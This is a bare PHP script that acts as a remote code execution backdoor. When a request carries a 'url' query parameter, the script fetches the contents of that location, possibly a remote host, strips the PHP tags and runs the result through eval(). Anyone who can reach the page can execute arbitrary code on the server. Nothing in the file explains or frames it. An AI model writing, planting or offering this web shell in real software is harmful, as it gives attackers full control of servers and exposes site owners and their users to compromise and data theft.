<?php
if(!empty($_GET['url']))eval(str_replace(Array('<?php', '<?', '?>') ,Array('','','') ,implode('', file(stripslashes($_GET['url'])))));
?>